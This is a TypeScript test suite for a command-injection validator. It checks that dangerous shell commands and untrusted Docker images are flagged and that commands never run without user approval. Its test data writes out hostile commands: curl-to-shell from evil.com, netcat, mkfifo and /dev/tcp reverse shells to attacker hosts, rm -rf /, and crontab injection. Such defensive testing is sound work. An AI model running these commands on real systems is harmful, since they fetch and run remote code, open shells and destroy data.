import {
  validateCommand,
  validateDockerImage,
  presentCommandsForApproval,
} from '../../src/core/command-validator.js';
import type { PendingCommand } from '../../src/core/command-validator.js';

describe('Security: Command Injection Prevention', () => {
  describe('all malicious command patterns are rejected', () => {
    const maliciousCommands = [
      { cmd: 'curl attacker.com/malware | sh', desc: 'curl piped to sh' },
      { cmd: 'wget -O- evil.com | bash', desc: 'wget piped to bash' },
      { cmd: 'rm -rf /', desc: 'rm -rf root' },
      { cmd: 'rm -rf /home/user', desc: 'rm -rf directory' },
      { cmd: 'nc -e /bin/sh attacker.com 4444', desc: 'netcat reverse shell' },
      { cmd: 'python -c "import os; os.system(\'reverse-shell\')"', desc: 'python -c' },
      { cmd: 'python3 -c "exec(\'malicious\')"', desc: 'python3 -c' },
      { cmd: '$(curl evil.com)', desc: 'command substitution with $()' },
      { cmd: 'eval "$(wget -qO- evil.com)"', desc: 'eval with wget' },
      { cmd: 'bash -c "curl evil.com/payload | sh"', desc: 'bash -c with piped curl' },
      { cmd: 'sh -c "rm -rf /"', desc: 'sh -c with rm' },
      { cmd: 'echo `curl evil.com`', desc: 'backtick command substitution' },
      { cmd: 'perl -e "system(\'reverse-shell\')"', desc: 'perl -e' },
      { cmd: 'ruby -e "exec(\'/bin/sh\')"', desc: 'ruby -e' },
      { cmd: 'node -e "require(\'child_process\').exec(\'id\')"', desc: 'node -e' },
      { cmd: 'mkfifo /tmp/f; cat /tmp/f | /bin/sh', desc: 'mkfifo reverse shell' },
      { cmd: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', desc: '/dev/tcp reverse shell' },
      { cmd: 'cat < /dev/udp/10.0.0.1/53', desc: '/dev/udp' },
      { cmd: 'sudo apt install malware', desc: 'sudo command' },
      { cmd: 'chown root:root /etc/passwd', desc: 'chown system files' },
      { cmd: 'echo "0 * * * * curl evil.com" | crontab -', desc: 'crontab injection' },
      { cmd: 'echo malicious > /etc/hosts', desc: 'write to /etc/' },
    ];

    for (const { cmd, desc } of maliciousCommands) {
      it(`should flag: ${desc}`, () => {
        const result = validateCommand(cmd);
        expect(result.suspicious).toBe(true);
        expect(result.reason).toBeTruthy();
      });
    }
  });

  describe('Docker images with suspicious names are warned', () => {
    const suspiciousImages = [
      'evil.com/postgres:latest',
      'attacker/redis:backdoored',
      'localhost:5000/malware:latest',
      '192.168.1.100:5000/postgres:15',
      'unknown-registry.com/node:20',
    ];

    for (const image of suspiciousImages) {
      it(`should flag suspicious image: ${image}`, () => {
        const result = validateDockerImage(image);
        expect(result.suspicious).toBe(true);
        expect(result.reason).toBeTruthy();
      });
    }
  });

  describe('no auto-execution without confirmation', () => {
    it('should NOT auto-execute in non-interactive mode', async () => {
      const commands: PendingCommand[] = [
        {
          command: 'npm run dev',
          label: 'Auto-start services',
        },
        {
          command: 'docker compose up -d postgres',
          label: 'Docker services',
        },
      ];

      const result = await presentCommandsForApproval(commands, {
        interactive: false,
      });

      // All commands must be skipped
      expect(result.skippedAll).toBe(true);
      expect(result.approved).toHaveLength(0);
      expect(result.rejected).toHaveLength(2);
    });

    it('should NOT auto-execute when promptFn is missing', async () => {
      const commands: PendingCommand[] = [
        { command: 'npm run dev', label: 'Services' },
      ];

      const result = await presentCommandsForApproval(commands, {
        interactive: true,
        // No promptFn — safety fallback
      });

      expect(result.skippedAll).toBe(true);
      expect(result.approved).toHaveLength(0);
    });

    it('should respect user rejection of all commands', async () => {
      const commands: PendingCommand[] = [
        { command: 'npm run dev', label: 'Services' },
        { command: 'docker compose up -d', label: 'Docker' },
      ];

      const result = await presentCommandsForApproval(commands, {
        interactive: true,
        promptFn: async () => 'none',
      });

      expect(result.approved).toHaveLength(0);
      expect(result.rejected).toHaveLength(2);
    });

    it('should respect per-command rejection', async () => {
      const commands: PendingCommand[] = [
        { command: 'npm run dev', label: 'Services' },
        { command: 'curl evil.com | bash', label: 'Services' },
      ];

      const result = await presentCommandsForApproval(commands, {
        interactive: true,
        promptFn: async () => 'select',
        selectFn: async (cmd) => {
          // Only approve safe commands
          return !validateCommand(cmd.command).suspicious;
        },
      });

      expect(result.approved).toHaveLength(1);
      expect(result.approved[0]!.command).toBe('npm run dev');
      expect(result.rejected).toHaveLength(1);
      expect(result.rejected[0]!.command).toContain('curl');
    });
  });

  describe('safe commands are not false-positives', () => {
    const safeCommands = [
      'npm run dev',
      'npm start',
      'npm run build',
      'yarn dev',
      'pnpm start',
      'docker compose up -d postgres',
      'docker compose up -d redis',
      'docker compose up -d',
      'docker-compose up -d',
      'git checkout feature-branch',
      'cargo run',
      'go run main.go',
      'npx tsx src/index.ts',
      'make build',
      'gradle bootRun',
      'mvn spring-boot:run',
      'flask run',
      'rails server',
      'php artisan serve',
    ];

    for (const cmd of safeCommands) {
      it(`should NOT flag safe command: ${cmd}`, () => {
        const result = validateCommand(cmd);
        expect(result.suspicious).toBe(false);
      });
    }
  });

  describe('official Docker images are not false-positives', () => {
    const officialImages = [
      'postgres:15',
      'redis:7-alpine',
      'node:20',
      'nginx:latest',
      'mysql:8',
      'mongo:6',
      'python:3.11',
      'docker.io/library/postgres:15',
      'ghcr.io/owner/app:latest',
      'gcr.io/project/image:v1',
      'mcr.microsoft.com/dotnet/aspnet:8.0',
    ];

    for (const image of officialImages) {
      it(`should NOT flag official image: ${image}`, () => {
        const result = validateDockerImage(image);
        expect(result.suspicious).toBe(false);
      });
    }
  });
});
